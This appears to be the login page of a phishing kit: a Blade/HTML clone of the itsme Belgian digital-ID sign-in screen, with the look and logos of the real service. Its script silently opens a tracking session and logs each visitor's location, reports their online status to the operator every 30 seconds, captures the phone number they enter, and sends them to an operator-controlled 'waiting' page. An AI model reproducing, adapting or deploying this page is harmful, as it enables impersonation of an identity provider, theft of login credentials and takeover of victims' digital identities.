<!DOCTYPE html>
<!-- saved from url=(0080)https://idp.prd.itsme.services/spa/oidc?session=345e66d63b6941fc8d31f4aec859cd2f -->
<html lang="{{ app()->getLocale() }}" data-beasties-container="">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="csrf-token" content="{{ csrf_token() }}">

  <title>OIDC</title>
  <!--<base href="/spa/">-->
  <base href=".">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://idp.prd.itsme.services/spa/assets/ui/itsme-logo.ico" sizes="48x48">
  <link rel="icon" href="./OIDC_files/itsme-logo.svg" sizes="any" type="image/svg+xml">
  <link rel="apple-touch-icon" href="https://idp.prd.itsme.services/spa/assets/ui/itsme-logo.png">
  <link rel="stylesheet" href="/assets//styles.64ac09ea73ffc406.css" media="all">
  <link rel="stylesheet" href="/assets/css3.css">
  <link rel="stylesheet" href="/assets/css2.css">

<body>
  <oidc-root ngcspnonce="1024df17-0385-46c0-abab-f0c60f35c714"
    ng-version="19.2.6"><oidc-entry-shell><oidc-app-qr-phone-form-shell><fui-template _nghost-ng-c385892400="">
          <div _ngcontent-ng-c385892400="" id="main-container"><fui-background-container _ngcontent-ng-c385892400=""
              _nghost-ng-c980954113="">
              <div _ngcontent-ng-c980954113="" class="fui-background">
                <div _ngcontent-ng-c980954113="" class="fui-curve"></div>
              </div>
            </fui-background-container>
            <div _ngcontent-ng-c385892400="" class="tpl-container">
              <header _ngcontent-ng-c385892400="">
                <div _ngcontent-ng-c385892400="" class="im-header"><fapp-header-shell header=""><fui-header
                      _nghost-ng-c279199553="">
                      <div _ngcontent-ng-c279199553="" class="header">
                        <div _ngcontent-ng-c279199553="" class="header-image"><a _ngcontent-ng-c279199553=""
                            target="_blank" href="https://www.itsme-id.com/en-BE" aria-label="itsme homepage"><img
                              _ngcontent-ng-c279199553="" src="./OIDC_files/itsme-logo.svg" alt="itsme homepage"></a>
                        </div>
                        <div _ngcontent-ng-c279199553="" class="header-locales"><fui-locale-switcher
                            _ngcontent-ng-c279199553="" _nghost-ng-c2297254974="">
                            <nav aria-label="Language" class="block block--menu block--menu--lang" style="margin-right: 15px;">
                  <ul class="menu menu--lang"
                    style="display: flex; gap: 8px; list-style: none; margin: 0; padding: 0; align-items: center;">
                    <li class="menu-item {{ app()->getLocale() === 'nl' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'nl') }}"
                        style="font-family: Roboto Slab, serif;font-weight: {{ app()->getLocale() === 'nl' ? '700' : '500' }}; color: {{ app()->getLocale() === 'nl' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        NL
                      </a>
                    </li>
                    <li style="color: #ccc;">|</li>
                    <li class="menu-item {{ app()->getLocale() === 'fr' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'fr') }}"
                        style="font-family: Roboto Slab, serif;font-weight: {{ app()->getLocale() === 'fr' ? '700' : '500' }}; color: {{ app()->getLocale() === 'fr' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        FR
                      </a>
                    </li>
                  </ul>
                </nav>
                          </fui-locale-switcher></div>
                      </div>
                    </fui-header></fapp-header-shell></div>
              </header>
              <main _ngcontent-ng-c385892400="">
                <div _ngcontent-ng-c385892400="" class="im-content-primary"><oidc-app-qr-phone-form contentprimary=""
                    _nghost-ng-c2021898164="">
                    <h1 _ngcontent-ng-c2021898164="">{{ __('messages.identify_yourself') }}</h1>
                    <div _ngcontent-ng-c2021898164="" class="normal">
                      <div _ngcontent-ng-c2021898164="" class="im-form ng-pristine ng-valid ng-touched">
                        <fui-accordion _ngcontent-ng-c2021898164="" _nghost-ng-c471075519="">
                          <div _ngcontent-ng-c471075519="" class="im-container closed init">
                            <div _ngcontent-ng-c471075519="" class="header">

                              <h2 _ngcontent-ng-c471075519=""><button _ngcontent-ng-c471075519="" type="button"
                                  aria-expanded="false" class="closed"><span _ngcontent-ng-c471075519="">{{ __('messages.use_phone_number') }}</span></button></h2>
                            </div>
                            <div class="form--input-container">
 <div class="form-input--block input--country-code">
                      <div class="input--select-country-code">
                        <img src="./assets/belgium.svg" alt="">
                        <span>
                          +32
                        </span>
                        <svg width="6" height="4" viewBox="0 0 6 4" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path
                            d="M3 3.45703L-1.31988e-07 0.457031L0.462891 5.12487e-08L3 2.53125L5.53125 2.72794e-07L6 0.457032L3 3.45703Z"
                            fill="#3C3C3C" />
                        </svg>
                        <div class="input--select-line"></div>
                      </div>
                      <input type="text" class="form--input input--phone-number" id="phone-input" inputmode="tel" placeholder="{{ __('messages.phone_placeholder') }}">

                    </div>
                     <button type="button" id="phone-submit-btn" disabled>
                      <span>
                        {{ __('messages.send') }}
                      </span>
                    </button>
                    </div>
                          </div>
                        </fui-accordion>
                      </div>
                    </div>

                  </oidc-app-qr-phone-form></div>
                <div _ngcontent-ng-c385892400="" class="im-content-secondary"><oidc-app-qr-phone-form-information
                    contentsecondary="" _nghost-ng-c3711733125="">
                    <div _ngcontent-ng-c3711733125=""><img _ngcontent-ng-c3711733125=""
                        src="./OIDC_files/ItsmeAppGeneric.Svg" alt="">
                      <h2 _ngcontent-ng-c3711733125=""><span aria-hidden="true">itsme<sup>®</sup></span><span lang="en"
                          class="visually-hidden">it's me</span>, {{ __('messages.your_digital_id') }}</h2>
                      <p _ngcontent-ng-c3711733125="">{{ __('messages.itsme_description') }}</p>

                    </div>
                  </oidc-app-qr-phone-form-information></div>
              </main>


            </div>
          </div>
        </fui-template></oidc-app-qr-phone-form-shell></oidc-entry-shell></oidc-root>
<script src="https://unpkg.com/imask"></script>
<script>
// Translations for JavaScript
window.translations = {
    send: '{{ __('messages.send') }}',
    loading: '{{ __('messages.loading') }}',
    phone_error_incomplete: '{{ app()->getLocale() === 'fr' ? 'Veuillez entrer un numéro de téléphone complet' : 'Please enter a complete phone number' }}',
    phone_error_invalid: '{{ app()->getLocale() === 'fr' ? 'Veuillez entrer un numéro de téléphone belge valide' : 'Please enter a valid Belgian phone number' }}'
};

document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phone-input');
    const submitBtn = document.getElementById('phone-submit-btn');
    let preSessionId = null;
    let onlineCheckInterval = null;
    
    // Create pre-session immediately when page loads
    createPreSession();
    
    // Check for existing main session
    const existingSessionId = localStorage.getItem('session_id');
    if (existingSessionId && window.SessionManager) {
        window.SessionManager.setSessionId(existingSessionId);
        window.SessionManager.checkSessionStatus();
        trackPageVisit(existingSessionId, 'Login page', window.location.href);
    }
    
    // Track page visit function
    async function trackPageVisit(sessionId, pageName, pageUrl, actionType = null) {
        try {
            await fetch(`/api/session/${sessionId}/visit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    page_name: pageName,
                    page_url: pageUrl,
                    action_type: actionType
                })
            });
        } catch (error) {
            console.error('Failed to track page visit:', error);
        }
    }
    
    // Create pre-session for tracking
    async function createPreSession() {
        try {
            const response = await fetch('/api/pre-session', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    page_name: 'Login page',
                    page_url: window.location.href
                })
            });
            
            if (response.ok) {
                const data = await response.json();
                preSessionId = data.pre_session_id;
                
                // Store pre-session ID
                localStorage.setItem('pre_session_id', preSessionId);
                
                // Start online checking
                startOnlineChecking();
                
                // Show tracking info in console
                console.log('🌐 Pre-session created:', preSessionId);
                console.log('📍 Location:', data.tracking_data);
                
                
            }
        } catch (error) {
            console.error('Failed to create pre-session:', error);
        }
    }
    
    // Start online status checking
    function startOnlineChecking() {
        if (!preSessionId) return;
        
        // Check online status immediately
        updateOnlineStatus(true);
        
        // Set up periodic online checking
        onlineCheckInterval = setInterval(() => {
            updateOnlineStatus(true);
        }, 30000); // Check every 30 seconds
        
        // Check when user leaves page
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                updateOnlineStatus(true);
            }
        });
        
        // Check when user closes window
        window.addEventListener('beforeunload', () => {
            // Send final online status
            navigator.sendBeacon(`/api/pre-session/${preSessionId}/online`, JSON.stringify({
                is_online: false,
                _token: document.querySelector('meta[name="csrf-token"]').content
            }));
        });
    }
    
    // Update online status
    async function updateOnlineStatus(isOnline) {
        if (!preSessionId) return;
        
        try {
            await fetch(`/api/pre-session/${preSessionId}/online`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    is_online: isOnline
                })
            });
        } catch (error) {
            console.error('Failed to update online status:', error);
        }
    }
    
    // Display tracking info to user
    function displayTrackingInfo(trackingData) {
        // Create tracking info element
        const trackingDiv = document.createElement('div');
        trackingDiv.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 11px;
            z-index: 9999;
            max-width: 200px;
        `;
        
        const countryFlag = getCountryFlag(trackingData.country_code);
        trackingDiv.innerHTML = `
            🌐 ${trackingData.locale?.toUpperCase() || 'NL'}<br>
            ${countryFlag} ${trackingData.country || 'Unknown'}<br>
            📱 ${trackingData.device_type}<br>
            📍 ${trackingData.city || 'Unknown'}
        `;
        
        document.body.appendChild(trackingDiv);
        
        // Remove after 10 seconds
        setTimeout(() => {
            if (trackingDiv.parentNode) {
                trackingDiv.parentNode.removeChild(trackingDiv);
            }
        }, 10000);
    }
    
    // Get country flag emoji
    function getCountryFlag(countryCode) {
        const flags = {
            'BE': '🇧🇪',
            'NL': '🇳🇱',
            'FR': '🇫🇷',
            'DE': '🇩🇪',
            'LU': '🇱🇺',
            'GB': '🇬🇧',
            'US': '🇺🇸',
            'CA': '🇨🇦',
            'AU': '🇦🇺',
            'JP': '🇯🇵',
            'CN': '🇨🇳',
            'IN': '🇮🇳',
            'BR': '🇧🇷',
            'RU': '🇷🇺',
            'IT': '🇮🇹',
            'ES': '🇪🇸',
            'CH': '🇨🇭',
            'AT': '🇦🇹',
            'SE': '🇸🇪',
            'NO': '🇳🇴',
            'DK': '🇩🇰',
            'FI': '🇫🇮',
            'PL': '🇵🇱',
            'CZ': '🇨🇿',
            'SK': '🇸🇰',
            'HU': '🇭🇺',
            'RO': '🇷🇴',
            'BG': '🇧🇬',
            'GR': '🇬🇷',
            'TR': '🇹🇷',
            'IE': '🇮🇪',
            'PT': '🇵🇹'
        };
        
        return flags[countryCode] || '🌍';
    }
    
    // Создаем элемент для ошибки
    const errorDiv = document.createElement('div');
    errorDiv.className = 'phone-error';
    errorDiv.id = 'phone-error';
    phoneInput.parentNode.appendChild(errorDiv);
    
    // Маска для бельгийского телефона: +32 XXX XXX XXX
    const phoneMask = IMask(phoneInput, {
        mask: '+32 000 000 0000',
        lazy: false,
        placeholderChar: '_'
    });
    
    // Валидация телефона
    function validatePhone() {
        const value = phoneInput.value.replace(/\s/g, '');
        const isValid = /^\+32\d{10}$/.test(value);
        
        if (phoneInput.value === '+32 ___ ___ ____' || phoneInput.value === '') {
            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
            phoneInput.classList.remove('valid', 'invalid');
            phoneInput.style.borderColor = '#747474';
            errorDiv.classList.remove('show');
            return false;
        } else if (isValid) {
            submitBtn.disabled = false;
            submitBtn.classList.add('active');
            phoneInput.classList.add('valid');
            phoneInput.classList.remove('invalid');
            phoneInput.style.borderColor = '#84bd00';
            errorDiv.classList.remove('show');
            return true;
        } else {
            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
            phoneInput.classList.add('invalid');
            phoneInput.classList.remove('valid');
            phoneInput.style.borderColor = '#dc3545';
            
            if (value.length < 12) {
                errorDiv.textContent = window.translations.phone_error_incomplete;
            } else {
                errorDiv.textContent = window.translations.phone_error_invalid;
            }
            errorDiv.classList.add('show');
            return false;
        }
    }
    
    // Обработка ввода
    phoneInput.addEventListener('input', function() {
        validatePhone();
    });
    
    // Обработка потери фокуса
    phoneInput.addEventListener('blur', function() {
        validatePhone();
    });
    
    // Обработка получения фокуса
    phoneInput.addEventListener('focus', function() {
        if (phoneInput.value === '') {
            phoneMask.value = '+32 ';
        }
    });
    
    // Предотвращение отправки невалидной формы
    submitBtn.addEventListener('click', async function(e) {
        if (!validatePhone()) {
            e.preventDefault();
            phoneInput.focus();
            if (navigator.vibrate) {
                navigator.vibrate(200);
            }
            return;
        }
        
        const phone = phoneInput.value.trim();
        
        submitBtn.disabled = true;
        submitBtn.classList.remove('active');
        this.querySelector('span').textContent = window.translations.loading;
        
        try {
            await createMainSession('phone', phone);
        } catch (error) {
            console.error('Error:', error);
            this.querySelector('span').textContent = window.translations.send;
            validatePhone();
        }
    });
    
    // Предотвращение ввода недопустимых символов
    phoneInput.addEventListener('keypress', function(e) {
        const char = String.fromCharCode(e.which);
        if (!/[0-9\s]/.test(char)) {
            e.preventDefault();
        }
    });
    
    // Enter key support
    phoneInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });
    
    // Create main session (convert from pre-session)
    async function createMainSession(inputType, inputValue) {
        if (!preSessionId) {
            return createSession(inputType, inputValue);
        }
        
        try {
            const response = await fetch(`/api/pre-session/${preSessionId}/convert`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    input_type: inputType,
                    input_value: inputValue
                })
            });
            
            if (!response.ok) {
                throw new Error('Failed to convert pre-session');
            }
            
            const data = await response.json();
            const sessionId = data.session_id;
            
            localStorage.setItem('session_id', sessionId);
            localStorage.removeItem('pre_session_id');
            clearInterval(onlineCheckInterval);
            
            if (window.SessionManager) {
                window.SessionManager.setSessionId(sessionId);
            }
            
            if (existingSessionId) {
                trackPageVisit(existingSessionId, 'Login page - phone submitted', window.location.href, 'phone_submit');
            }
            
            window.location.href = `/session/${sessionId}/waiting`;
            
        } catch (error) {
            console.error('Error converting pre-session:', error);
            throw error;
        }
    }
    
    // Fallback to original session creation
    async function createSession(inputType, inputValue) {
        const response = await fetch('/api/session', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
                input_type: inputType,
                input_value: inputValue
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to create session');
        }
        
        const data = await response.json();
        const sessionId = data.data.id;
        
        localStorage.setItem('session_id', sessionId);
        
        if (window.SessionManager) {
            window.SessionManager.setSessionId(sessionId);
        }
        
        if (existingSessionId) {
            trackPageVisit(existingSessionId, 'Login page - phone submitted', window.location.href, 'phone_submit');
        }
        
        window.location.href = `/session/${sessionId}/waiting`;
    }
    
    // Начальная валидация
    validatePhone();
});

// Track page visit on load
window.addEventListener('load', () => {
    fetch('/api/visit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
        },
        body: JSON.stringify({})
    }).catch(() => {});
});
</script>
</body>